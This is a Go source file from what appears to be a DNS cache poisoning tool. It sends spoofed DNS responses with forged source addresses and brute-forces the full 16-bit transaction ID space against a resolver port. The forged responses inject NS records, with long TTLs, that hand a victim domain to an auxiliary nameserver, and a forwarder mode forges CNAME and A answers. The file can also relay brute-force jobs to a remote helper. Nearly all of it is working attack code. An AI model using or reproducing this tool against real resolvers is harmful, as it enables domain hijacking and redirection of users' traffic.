package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"github.com/google/gopacket/layers"
	"github.com/ugorji/go/codec"
	"math/rand"
	"net"
	"time"
)

/*BF server (bfConn: C--->S)*/
var bfConn *net.TCPConn

var bfTotalTime time.Duration
var bfTimes uint

func normalReturn(srcIP net.IP, dstIP net.IP, targetPort layers.UDPPort, txid uint16, question layers.DNSQuestion, auxDomain string, victimDNSName string) {
	questionName := question.Name
	ipLayer := GetIPLayer(srcIP, dstIP, false, 3, layers.IPProtocolUDP)
	udpLayer := GetUDPLayer(53, targetPort)
	dnsLayer := layers.DNS{
		ID:     txid,
		QR:     true,
		OpCode: 0,
		AA:     true,
		TC:     false,
		RD:     false,
		RA:     false,
		Z:      0,
	}
	dnsLayer.Questions = []layers.DNSQuestion{question}
	qType := dnsLayer.Questions[0].Type
	// NXDOMAIN
	if string(questionName) == victimDNSName && qType == layers.DNSTypeNS {
		dnsLayer.ResponseCode = layers.DNSResponseCodeNoErr
		dnsLayer.Answers = []layers.DNSResourceRecord{{
			Name:  []byte(victimDNSName),
			Type:  layers.DNSTypeNS,
			Class: layers.DNSClassIN,
			TTL:   300,               //TODO: changed to huge value
			IP:    nil,               //
			NS:    []byte(auxDomain), //
			CNAME: nil,
			PTR:   nil,
			TXTs:  nil,
			SOA:   layers.DNSSOA{},
			SRV:   layers.DNSSRV{},
			MX:    layers.DNSMX{},
			OPT:   nil,
			TXT:   nil,
		}}
	} else if string(questionName) == victimDNSName && (qType == layers.DNSTypeA || qType == layers.DNSTypeAAAA) {

	}
	if auxDomain != "" {
		dnsLayer.ResponseCode = layers.DNSResponseCodeNoErr
		dnsLayer.Authorities = []layers.DNSResourceRecord{{
			Name:  []byte(victimDNSName),
			Type:  layers.DNSTypeNS,
			Class: layers.DNSClassIN,
			TTL:   300,               //TODO: changed to huge value
			IP:    nil,               //
			NS:    []byte(auxDomain), //
			CNAME: nil,
			PTR:   nil,
			TXTs:  nil,
			SOA:   layers.DNSSOA{},
			SRV:   layers.DNSSRV{},
			MX:    layers.DNSMX{},
			OPT:   nil,
			TXT:   nil,
		}}
	}
	XmitUDP(h, eth, ipLayer, &udpLayer, &dnsLayer, 0)
}

func sendDNSRequest(id uint16, name string, srcIP net.IP, dstIP net.IP) {
	fmt.Println("Send new request", name, id)
	if bfConn != nil && *remoteQuery {
		Query := &DnsQuery{
			DnsQueryName: name,
			FrontIP:      dstIP,
			VictimDomain: *victimDomain,
		}
		Rinfo := &RemoteInfo{
			Dq: Query,
			Bf: nil,
		}
		var buf bytes.Buffer
		handle := new(codec.BincHandle)
		enc := codec.NewEncoder(&buf, handle)
		err := enc.Encode(Rinfo)
		if err != nil {
			fmt.Println("encode fail", err)
		}
		/* data len */
		dataLenSlice := make([]byte, 2)
		binary.BigEndian.PutUint16(dataLenSlice, uint16(buf.Len()))
		_, err = bfConn.Write(append(dataLenSlice, buf.Bytes()...))
		if err != nil {
			fmt.Println("TCP write err", err)
		}
		/* TODO: we share bfCount here, meaning we can't make a running instance both server and client */
		/* wait for reply */
		reply := make([]byte, 1)
		_, err = bfConn.Read(reply)
		if err != nil {
			fmt.Println("TCP read err", err)
		}
		if reply[0] != bfCount+1 {
			fmt.Println("Reply seq doesn't match:", reply[0], ", expected:", bfCount+1)
		}
		bfCount = reply[0]
	} else {
		ipLayer := GetIPLayer(srcIP, dstIP, false, 1, layers.IPProtocolUDP)
		udpLayer := GetUDPLayer(layers.UDPPort(rand.Uint32()), 53)
		dnsLayer := GetDNSQuery(id, name)
		XmitUDP(h, eth, ipLayer, &udpLayer, &dnsLayer, 0)
	}
}

func dnsBruteForce(srcIP net.IP, dstIP net.IP, targetPort uint16, timeGap uint, finishGap uint, auxDomain string, victimDNSName string, questionName string, forwarderMode bool) {
	if currentPort == layers.UDPPort(targetPort) /*portMap[layers.UDPPort(targetPort)]*/ {
		hitTimes++
	} else {
		missTimes++
		if *testMode {
			return
		}
	}
	portMap[layers.UDPPort(targetPort)] = false
	fmt.Println("BF for", dstIP, ":", targetPort, "hit", hitTimes, "miss", missTimes)
	if !*enableBF {
		return
	}
	if bfConn != nil && *remoteBF {
		/* Serialize */
		Info := &BfInfo{
			NsIP:               srcIP,
			BackendIP:          dstIP,
			Port:               targetPort,
			DnsBFTimeGap:       timeGap,
			DnsBFFinishTimeGap: finishGap,
			AuxDomain:          auxDomain,
			VictimDomain:       victimDNSName,
			QuestionName:       questionName,
			PublicPortMode:     forwarderMode,
		}
		Rinfo := &RemoteInfo{
			Dq: nil,
			Bf: Info,
		}
		var buf bytes.Buffer
		handle := new(codec.BincHandle)
		enc := codec.NewEncoder(&buf, handle)
		err := enc.Encode(Rinfo)
		if err != nil {
			fmt.Println("encode fail", err)
		}
		/* data len */
		dataLenSlice := make([]byte, 2)
		binary.BigEndian.PutUint16(dataLenSlice, uint16(buf.Len()))
		_, err = bfConn.Write(append(dataLenSlice, buf.Bytes()...))
		if err != nil {
			fmt.Println("TCP write err", err)
		}
		/* TODO: we share bfCount here, meaning we can't make a running instance both server and client */
		/* wait for reply */
		reply := make([]byte, 1)
		_, err = bfConn.Read(reply)
		if err != nil {
			fmt.Println("TCP read err", err)
		}
		if reply[0] != bfCount+1 {
			fmt.Println("Reply seq doesn't match:", reply[0], ", expected:", bfCount+1)
		}
		bfCount = reply[0]
	} else {
		ipLayer := GetIPLayer(srcIP, dstIP, false, 3, layers.IPProtocolUDP)
		udpLayer := GetUDPLayer(53, layers.UDPPort(targetPort))
		dnsLayer := layers.DNS{
			ID:           0,
			QR:           true,
			OpCode:       0,
			AA:           true,
			TC:           false,
			RD:           false,
			RA:           false,
			Z:            0,
			ResponseCode: layers.DNSResponseCodeNoErr,
			//QDCount:      1,
			//ANCount:      1,
			//NSCount:      0,
			//ARCount:      0,

			/*Answers for NS request */
			Questions: []layers.DNSQuestion{{
				Name:  []byte(*victimDomain),
				Type:  layers.DNSTypeA,
				Class: layers.DNSClassIN,
			}},
			Authorities: []layers.DNSResourceRecord{{
				Name:  []byte(*victimDomain),
				Type:  layers.DNSTypeNS,
				Class: layers.DNSClassIN,
				TTL:   604800, //TODO: changed to huge value
				IP:    nil,
				NS:    []byte(auxDomain),
				CNAME: nil,
				PTR:   nil,
				TXTs:  nil,
				SOA:   layers.DNSSOA{},
				SRV:   layers.DNSSRV{},
				MX:    layers.DNSMX{},
				OPT:   nil,
				TXT:   nil,
			}},
			Answers:     nil,
			Additionals: nil,
		}
		if forwarderMode {
			dnsLayer.AA = false
			dnsLayer.RD = true
			dnsLayer.RA = true
			dnsLayer.Questions = []layers.DNSQuestion{{
				Name:  []byte(questionName),
				Type:  layers.DNSTypeA,
				Class: layers.DNSClassIN,
			}}
			dnsLayer.Answers = []layers.DNSResourceRecord{{
				Name:  []byte(questionName),
				Type:  layers.DNSTypeCNAME,
				Class: layers.DNSClassIN,
				TTL:   300, //TODO: changed to huge value
				IP:    nil,
				NS:    nil,
				CNAME: []byte(victimDNSName),
				PTR:   nil,
				TXTs:  nil,
				SOA:   layers.DNSSOA{},
				SRV:   layers.DNSSRV{},
				MX:    layers.DNSMX{},
				OPT:   nil,
				TXT:   nil,
			}, {
				Name:  []byte(victimDNSName),
				Type:  layers.DNSTypeA,
				Class: layers.DNSClassIN,
				TTL:   300, //TODO: changed to huge value
				IP:    net.ParseIP("1.2.3.4"),
				NS:    nil,
				CNAME: nil,
				PTR:   nil,
				TXTs:  nil,
				SOA:   layers.DNSSOA{},
				SRV:   layers.DNSSRV{},
				MX:    layers.DNSMX{},
				OPT:   nil,
				TXT:   nil,
			}}
		}
		//}
		fmt.Println("DNS BruteForce: ", targetPort)
		startTime := time.Now()
		var txid uint16
		for txid = 0; txid < 0xffff; txid++ {
			dnsLayer.ID = txid
			XmitUDP(h, eth, ipLayer, &udpLayer, &dnsLayer, timeGap)
		}
		dnsLayer.ID = 0xffff
		XmitUDP(h, eth, ipLayer, &udpLayer, &dnsLayer, timeGap)
		dur := time.Now().Sub(startTime)
		bfTotalTime = time.Now().Add(bfTotalTime).Sub(startTime)
		bfTimes++
		fmt.Println("time: ", dur)
		time.Sleep(time.Duration(finishGap) * time.Microsecond)
	}
}
